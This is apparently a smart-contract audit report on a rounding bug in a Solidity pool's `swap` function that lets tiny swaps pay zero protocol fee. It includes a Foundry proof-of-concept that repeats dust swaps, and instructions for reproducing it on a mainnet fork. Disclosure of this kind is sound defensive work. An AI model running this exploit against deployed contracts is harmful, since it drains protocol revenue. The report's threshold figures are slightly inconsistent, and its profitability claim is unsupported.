### Title
Swap fee rounds to zero on small `Pool.swap` calls, letting users trade synthetics without paying protocol fees - ([File: contracts/Pool.sol](contracts/Pool.sol))

### Summary
`Pool.swap` charges its fee through `quoteSwapOut`, which computes `_fee = _amountOut.wadMul(_swapFee)`. `WadRayMath.wadMul` rounds half-up to the nearest integer wei, so whenever `_amountOut * _swapFee < 0.5e18` the fee is `0`. Since `swap` only rejects `amountIn_ == 0` and enforces no minimum trade size, any user holding synthetic tokens can split a trade into many small swaps and pay no swap fee at all — the same fee-bypass class as the BarnBridge `buyTokens` rounding bug.

### Finding Description
The fee is computed in `Pool.quoteSwapOut`:

```solidity
// contracts/Pool.sol:519-524
uint256 _swapFee = feeProvider.swapFees(address(syntheticTokenIn_), address(syntheticTokenOut_));
if (_swapFee > 0) {
    _fee = _amountOut.wadMul(_swapFee);
    _amountOut -= _fee;
}
```

`wadMul` adds `HALF_WAD` before dividing, i.e. `(a * b + 5e17) / 1e18` ( [1](#0-0) ). The result is `0` whenever `_amountOut * _swapFee < 5e17`. For a 10% swap fee (`0.1e18`) any `_amountOut <= 4` wei yields `_fee == 0`; for a 0.25% fee the threshold is `200` wei.

`Pool.swap` burns `amountIn_`, mints `_fee` to `feeCollector` only `if (_fee > 0)`, and mints the full `_amountOut` to the caller — so a zero-fee swap succeeds cleanly ( [2](#0-1) ). The only guards are `whenNotShutdown`, `nonReentrant`, `isSwapActive`, and `amountIn_ != 0` ( [3](#0-2) ); none enforce a minimum `amountIn_`/`_amountOut`.

The same truncation pattern exists in `quoteLiquidateOut` (`_fee = _toLiquidator.wadMul(_protocolFee)`), where dust repayments also round the protocol fee to zero ( [4](#0-3) ).

### Impact Explanation
The protocol's swap revenue invariant — every swap on a fee-enabled pair pays `swapFee` to `feeCollector` — is broken. An attacker holding msUSD/msETH (obtainable permissionlessly by depositing collateral and calling `DebtToken.issue`/`mint`) can call `swap` N times with `_amountOut` below the rounding threshold and convert unlimited notional volume fee-free, each iteration batched cheaply via `Operator.execute` or a custom attacker contract. On low-gas L2 deployments (Base, Optimism, Hemi, Plasma, Swell — all of which ship this `Pool` implementation) this is economically rational. The result is direct loss of protocol revenue / theft of fees that should accrue to `feeCollector`.

### Likelihood Explanation
- Reachable by any EOA: `swap` is public, only needs existing synthetic tokens and `isSwapActive`.
- No privileged role, oracle manipulation, or governance action required; only a nonzero `swapFee` for the pair, which is the normal configuration.
- Cost is linear gas per micro-swap; profitable on cheap L2s whenever fee savings exceed gas.
- Not blocked by caps, health checks, or pauses in the deployed configuration.

### Recommendation
- Enforce a minimum `amountIn_` (or minimum `_amountOut`) in `Pool.swap`, e.g. revert if `_amountOut * _swapFee <= 5e17`.
- Alternatively compute the fee with round-up semantics in the protocol's favor: `_fee = (_amountOut * _swapFee + 1e18 - 1) / 1e18`, or add a `wadMulUp`/`rayDivUp` helper.
- Apply the same treatment to `quoteLiquidateOut`'s protocol-fee leg.

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {Pool} from "../contracts/Pool.sol";
import {WadRayMath} from "../contracts/lib/WadRayMath.sol";

contract SwapFeeRoundingTest is Test {
    using WadRayMath for uint256;

    Pool pool;                 // deployed Pool proxy
    address msUSD;             // synthetic in
    address msETH;             // synthetic out, swapFee(msUSD,msETH) > 0
    address attacker = makeAddr("attacker");

    function test_swapFeeRoundsToZero() public {
        // Setup: attacker deposits collateral and mints msUSD (permissionless)
        uint256 swapFee = pool.feeProvider().swapFees(msUSD, msETH);
        vm.assume(swapFee > 0);

        // Find an amountIn whose quoted amountOut yields zero fee:
        // need amountOut * swapFee < 5e17  ->  amountOut < 5e17 / swapFee
        uint256 threshold = 5e17 / swapFee;           // e.g. 4 wei @ 10%, 199 @ 0.25%
        uint256 amountIn = 1;                          // wei of msUSD; tune to keep amountOut <= threshold
        deal(msUSD, attacker, amountIn * 1000);

        address feeCollector = pool.poolRegistry().feeCollector();
        uint256 feesBefore = IERC20(msETH).balanceOf(feeCollector);
        uint256 outBefore  = IERC20(msETH).balanceOf(attacker);

        vm.startPrank(attacker);
        uint256 loops = 1000;
        for (uint256 i; i < loops; ++i) {
            pool.swap(msUSD, msETH, amountIn);
        }
        vm.stopPrank();

        // Attacker received msETH for every swap, protocol collected nothing
        assertGt(IERC20(msETH).balanceOf(attacker), outBefore);
        assertEq(IERC20(msETH).balanceOf(feeCollector), feesBefore);
    }
}
```

Alternatively, a pure-math check reproduces the core without deployment:

```solidity
uint256 fee = uint256(4).wadMul(0.1e18);   // amountOut=4 wei, fee=10%
assertEq(fee, 0);                          // (4*0.1e18 + 5e17)/1e18 == 0
```

Reproduce on a mainnet/Base fork by pointing `pool`, `msUSD`, `msETH` at the deployed addresses from `deployments/base/` and choosing `amountIn` so the oracle-quoted `_amountOut` stays below `5e17 / swapFee`.
